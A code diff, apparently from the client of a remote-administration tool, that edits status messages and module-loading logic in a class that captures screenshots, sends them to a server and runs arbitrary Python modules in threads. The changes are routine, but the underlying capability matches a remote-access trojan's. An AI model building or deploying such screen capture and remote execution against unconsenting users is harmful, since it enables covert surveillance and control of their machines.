@@ -10,7 +10,7 @@ import threading
 import time
 
 from client.util.decorator import desc, params, enclosing, require_admin, require_integrity
-from common.util import logger, get_time, format_dict, parse
+from common.util import logger, get_time, format_dict, parse, get_size
 
 if os.name == 'nt':
     from client.util.win32util import *
@@ -125,13 +125,13 @@ class CommandExecutor:
 
     @desc('grab a screenshot')
     def screenshot(self):
-        self.send_to_server(1, 'Importing module...', 0)
+        self.send_to_server(1, 'Importing module: pyautogui', 0)
         import pyautogui
-        self.send_to_server(1, 'Preparing to take a screenshot...', 0)
+        self.send_to_server(1, 'Preparing to take a screenshot', 0)
         filename = 'screenshot_{}.png'.format(get_time())
         pyautogui.screenshot(filename)
         self.send_to_server(1, 'Screenshot success', 0)
-        self.send_to_server(1, f'Preparing to send file, length is {os.path.getsize(filename)}', 0)
+        self.send_to_server(1, f'Preparing to send file, length is {get_size(os.path.getsize(filename))}', 0)
         self.socket.send_file(self.command_id, filename)
         os.remove(filename)
 
@@ -144,9 +144,8 @@ class CommandExecutor:
         if not os.path.isfile(module_path):
             raise FileNotFoundError(f'File does not exist: {module_path}')
 
-            # 使用os.path.splitext()函数分离文件名和扩展名
         module_name, _ = os.path.splitext(os.path.basename(module_path))
-        # module_name = module[:-3]
+
         # 导入模块
         spec = importlib.util.spec_from_file_location(module_name, module_path)
         module = importlib.util.module_from_spec(spec)
@@ -171,7 +170,7 @@ class CommandExecutor:
                 return obj
         return None
 
-    @desc('Load module and execute in a new thread')
+    @desc('load module and execute in a new thread')
     def load(self, arg):
         if not arg.strip():
             modules = []
@@ -179,33 +178,42 @@ class CommandExecutor:
             for file in glob.iglob(os.path.join(module_dir, '**/*.py'), recursive=True):
                 modules.append(os.path.relpath(file, module_dir).replace('\\', '/'))
             return 1, '\n'.join(modules)
-        if not arg.startswith('.py'):
+        if not arg.endswith('.py'):
             arg += '.py'
-        self.send_to_server(1, f'Preparing to import module {arg}.', 0)
+        module_name, _ = os.path.splitext(os.path.basename(arg))
+        if module_name == 'module':
+            raise Exception(f'Not executable')
+        if module_name in self.imported_modules and self.imported_modules.get(module_name).status:
+            raise Exception(f'The module is already in progress')
+
+        self.send_to_server(1, f'Preparing to import module: {arg}', 0)
         instance = self.dynamic_import(arg)
         if instance:
-            self.send_to_server(1, f'Imported successfully, current imported module: {list(self.imported_modules.keys())}.',
+            self.send_to_server(1,
+                                f'Imported successfully, current imported modules: {list(self.imported_modules.keys())}',
                                 0)
-            self.send_to_server(1, 'New thread being started...', 0)
+            self.send_to_server(1, 'New thread being started', 0)
             thread = threading.Thread(target=instance.run)
             thread.start()
-            self.send_to_server(1, f'Successfully started the thread with the name {thread.name}.', 0)
-            module_name, _ = os.path.splitext(os.path.basename(arg))
-            self.send_to_server(1, f'Execute the command "stop {module_name}" to stop.', 0)
+
+            self.send_to_server(1,
+                                f'Successfully started the thread with the name {thread.name}\nExecute the command "stop {module_name}" to stop',
+                                0)
         else:
-            raise Exception(f'Failed to import module: {arg}.')
+            raise Exception(f'Failed to import module: {arg}')
 
     def stop(self, arg):
         if arg.endswith('.py'):
             # 使用切片去掉最后的 .py 部分
             arg = arg[:-3]
-        if arg in self.imported_modules:  # 去除结尾的.py
+        if arg in self.imported_modules:
             instance = self.imported_modules.get(arg)
-            instance.stop()
+            if instance.status:
+                instance.stop()
             self.imported_modules.pop(arg)
-            return 1, 'Interrupt signal sent.'
+            return 1, 'Interrupt signal sent'
         else:
-            return 0, 'The module has not been imported.'
+            return 0, 'The module has not been imported'
 
     @desc('get information')
     def getinfo(self):
